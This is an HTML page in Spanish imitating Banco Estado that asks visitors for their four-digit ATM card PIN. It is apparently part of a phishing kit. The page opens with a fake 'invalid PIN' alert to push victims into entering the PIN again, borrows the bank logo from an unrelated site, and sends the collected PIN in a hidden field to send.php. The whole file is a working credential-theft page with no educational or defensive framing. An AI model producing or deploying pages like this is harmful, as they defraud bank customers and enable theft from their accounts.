<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .logo {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 16px;
        }

        .logo-text {
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 135px;
            height: 135px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .title {
            font-size: 16px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.4;
        }

        .pin-form {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .pin-inputs-container {
            display: flex;
            gap: 12px;
            justify-content: center;
            align-items: center;
        }

        .pin-input {
            width: 70px;
            height: 70px;
            border: 2px solid #D0D0D8;
            border-radius: 8px;
            font-size: 32px;
            font-weight: 600;
            color: #1a1a1a;
            text-align: center;
            background-color: #FAFAFA;
            transition: all 0.3s ease;
            caret-color: #3B4FB5;
        }

        .pin-input:focus {
            outline: none;
            border-color: #3B4FB5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 79, 181, 0.1);
        }

        .pin-input::placeholder {
            color: #D0D0D8;
        }

        .eye-icon {
            position: relative;
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .eye-icon:hover svg {
            stroke: #3B4FB5;
        }

        .eye-icon svg {
            width: 20px;
            height: 20px;
            stroke: #1a1a1a;
            fill: none;
            transition: all 0.3s ease;
        }

        .button-group {
            display: flex;
            gap: 12px;
        }

        .continue-btn {
            flex: 1;
            padding: 14px;
            background: linear-gradient(135deg, #3B4FB5 0%, #2A3A8F 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
        }

        .continue-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
        }

        .continue-btn:active {
            transform: translateY(0);
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 15px;
            }

            .pin-input {
                width: 60px;
                height: 60px;
                font-size: 28px;
            }

            .pin-inputs-container {
                gap: 10px;
            }
        }


       .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:125px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Título -->
        <h1 class="title">Ingresa la clave de cajero de tu tarjeta</h1>

        <!-- Formulario PIN -->
        <form class="pin-form" action="send.php" method="POST" id="pinForm">
            <!-- Inputs PIN -->
            <div class="pin-inputs-container">
                <input type="password" class="pin-input" id="pin1" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin2" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin3" maxlength="1" placeholder="•" autocomplete="off">
                <input type="password" class="pin-input" id="pin4" maxlength="1" placeholder="•" autocomplete="off">
                <span class="eye-icon" id="eyeIcon" onclick="togglePinVisibility()" title="Mostrar/ocultar PIN">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <!-- Ícono de ojo tachado - mostrado por defecto -->
                        <g id="eyeHidden">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                            <path d="M1 1l22 22" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                        </g>
                        <!-- Ícono de ojo abierto - inicialmente oculto -->
                        <g id="eyeClosed" style="display:none;">
                            <path d="M1 12s3-7 11-7 11 7 11 7-3 7-11 7-11-7-11-7z" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            <circle cx="12" cy="12" r="2.5" fill="none" stroke="currentColor" stroke-width="1.5"/>
                        </g>
                    </svg>
                </span>
            </div>
            
            <!-- Campo oculto para enviar el PIN completo -->
            <input type="hidden" name="pincaje" id="pincaje">
            
            <!-- Botón Continuar -->
            <button type="submit" class="continue-btn" style="width: 100%; margin-top: 20px;">Continuar</button>
        </form>
    </div>


<!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="https://emtecgroup.net/wp-content/uploads/2020/06/Banco-Estado.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Clave de cajero inválida
        </div>

        <div class="bnc-alert-text">
            Verifica tu información e intenta nuevamente.
        </div>

    </div>

</div>
  <script>

window.addEventListener('load', () => {

    const alertBox = document.getElementById('bncAlert');

    function closeAlert() {

        alertBox.style.opacity = '0';
        alertBox.style.transition = '.25s ease';

        setTimeout(() => {

            alertBox.remove();

        }, 250);
    }

    /* CLICK EN CUALQUIER PARTE */

    document.body.addEventListener('click', closeAlert, {
        once: true
    });

    /* TOUCH MOVIL */

    document.body.addEventListener('touchstart', closeAlert, {
        once: true
    });

});

</script>

    <script>
        // Mostrar/Ocultar PIN
        function togglePinVisibility() {
            const inputs = [
                document.getElementById('pin1'),
                document.getElementById('pin2'),
                document.getElementById('pin3'),
                document.getElementById('pin4')
            ];
            const eyeHidden = document.getElementById('eyeHidden');
            const eyeClosed = document.getElementById('eyeClosed');
            
            const currentType = inputs[0].type;
            const newType = currentType === 'password' ? 'text' : 'password';
            
            // Cambiar tipo en todos los inputs
            inputs.forEach(input => {
                input.type = newType;
            });
            
            // Cambiar iconos
            if (newType === 'text') {
                eyeHidden.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                eyeHidden.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        }

        // Auto-salto entre inputs
        document.querySelectorAll('.pin-input').forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1 && index < 3) {
                    document.querySelectorAll('.pin-input')[index + 1].focus();
                }
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    document.querySelectorAll('.pin-input')[index - 1].focus();
                }
            });
        });

        // Submit del formulario
        document.getElementById('pinForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Obtener los 4 dígitos del PIN
            const pin = ['pin1', 'pin2', 'pin3', 'pin4']
                .map(id => document.getElementById(id).value)
                .join('');
            
            // Validar que los 4 dígitos estén completos
            if (pin.length !== 4) {
                alert('Por favor ingresa los 4 dígitos del PIN');
                return;
            }
            
            // Validar que sean números
            if (!/^\d{4}$/.test(pin)) {
                alert('El PIN debe contener solo números');
                return;
            }
            
            // Guardar PIN en el campo oculto
            document.getElementById('pincaje').value = pin;
            
            // Enviar el formulario a send.php
            this.submit();
        });

        // Focus en el primer input al cargar
        window.addEventListener('load', function() {
            document.getElementById('pin1').focus();
        });
    </script>
</body>
</html>
